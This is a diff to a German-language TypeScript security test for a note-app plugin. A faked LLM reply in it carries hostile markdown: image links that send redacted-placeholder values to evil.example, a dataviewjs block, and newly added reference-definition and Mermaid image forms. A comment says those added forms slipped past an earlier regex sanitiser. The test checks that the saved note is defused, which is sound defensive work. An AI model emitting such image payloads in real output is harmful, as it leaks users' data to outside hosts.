@@ -1345,7 +1345,7 @@ async function pruefeSchutz(cdp: Cdp, aufraeumen: string[]): Promise<void> {
     "V4 Die Deutung zeigt das Original wieder (Schwaerzung ist umkehrbar)",
     "V5 Eine Antwort mit Bild-URL und Platzhalter erzeugt kein img-Element",
     "V6 Ein dataviewjs-Block in der Antwort rendert als Text, nicht als Codeblock",
-    "V7 Die gespeicherte Notiz traegt die entschaerfte Form (```text statt ```dataviewjs, kein Fernbild), kein dataviewjs-Code im DOM",
+    "V7 Die gespeicherte Notiz traegt die entschaerfte Form (```text statt ```dataviewjs und ```mermaid, kein Fernbild, auch nicht als Referenz-Definition), kein dataviewjs-Code im DOM",
     "V8 Die gespeicherte Notiz laedt das Fernbild nicht (Zaehler am Draht bleibt 0)",
   ];
   const P = `app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}]`;
@@ -1359,7 +1359,9 @@ async function pruefeSchutz(cdp: Cdp, aufraeumen: string[]): Promise<void> {
       const platzhalter = [...JSON.stringify(body.messages).matchAll(/\[redacted-[a-z-]+-\d+\]/g)].map((m) => m[0]);
       const liste = platzhalter.length ? platzhalter : ["(kein Platzhalter gesehen)"];
       const pixel = fake ? `![p](${fake.url}/pixel?d=1)\n\n` : "";
-      return `Echo ${liste.join(" ")}\n\n${pixel}${liste.map((p) => `![x](https://evil.example/?d=${p})`).join("\n")}\n\n\`\`\`dataviewjs\ndv.paragraph("smoke")\n\`\`\`\n`;
+      // Referenz-Definition mit Zeilenumbruch im Label und Mermaid-Bildform: beide lud die Regex-Schicht bis code-kit 0.19.1.
+      const luecken = fake ? `![r][a b]\n\n[a\nb]: ${fake.url}/pixel?d=2\n\n\`\`\`mermaid\ngraph TD\n  A@{ img: "${fake.url}/pixel?d=3" }\n\`\`\`\n\n` : "";
+      return `Echo ${liste.join(" ")}\n\n${pixel}${luecken}${liste.map((p) => `![x](https://evil.example/?d=${p})`).join("\n")}\n\n\`\`\`dataviewjs\ndv.paragraph("smoke")\n\`\`\`\n`;
     });
     console.log(`  Fake-Endpunkt: ${fake.url}`);
     vorher = await cdp.evaluate(`const l = ${P}.settings.llm; return { eps: l.endpoints, model: l.model, choice: l.choice ?? null, out: ${P}.settings.defaultOutput };`);
@@ -1413,9 +1415,9 @@ async function pruefeSchutz(cdp: Cdp, aufraeumen: string[]): Promise<void> {
     const leaf = await cdp.evaluate<{ kopf: boolean; dvjs: number }>(`
       const v = document.querySelector(".workspace-leaf.mod-active .view-content");
       return { kopf: Boolean(v && /AI Interpretation|KI-Deutung/.test(v.textContent ?? "")), dvjs: v ? v.querySelectorAll("code.language-dataviewjs, .language-dataviewjs").length : -1 };`);
-    const form = notiz.includes("```text") && !notiz.includes("```dataviewjs") && !notiz.includes("![p](") && !notiz.includes("![x](");
+    const form = notiz.includes("```text") && !notiz.includes("```dataviewjs") && !notiz.includes("![") && !notiz.includes("```mermaid") && notiz.includes("[r]");
     record(NAMEN[6]!, gespeichert && neu.length === 1 && form && leaf.kopf && leaf.dvjs === 0,
-      `neue Notizen: ${neu.length}, Fence text: ${notiz.includes("```text") ? "ja" : "nein"}, Fence dataviewjs in Datei: ${notiz.includes("```dataviewjs") ? "JA" : "nein"}, Fernbild-Syntax in Datei: ${/!\[[px]\]\(/.test(notiz) ? "JA" : "nein"}, Ueberschrift gerendert (Positivkontrolle): ${leaf.kopf ? "ja" : "nein"}, code.language-dataviewjs im DOM: ${leaf.dvjs}`);
+      `neue Notizen: ${neu.length}, Fence text: ${notiz.includes("```text") ? "ja" : "nein"}, Fence dataviewjs in Datei: ${notiz.includes("```dataviewjs") ? "JA" : "nein"}, Fernbild-Syntax in Datei: ${notiz.includes("![") ? "JA" : "nein"}, Fence mermaid in Datei: ${notiz.includes("```mermaid") ? "JA" : "nein"}, Ueberschrift gerendert (Positivkontrolle): ${leaf.kopf ? "ja" : "nein"}, code.language-dataviewjs im DOM: ${leaf.dvjs}`);
     record(NAMEN[7]!, gespeichert && neu.length === 1 && leaf.kopf && pixelVorher === 0 && fake.pixelCalls() === 0,
       `GET /pixel am Fake-Server: ${pixelVorher} vor, ${fake.pixelCalls()} nach dem Speichern`);
   } catch (e) {
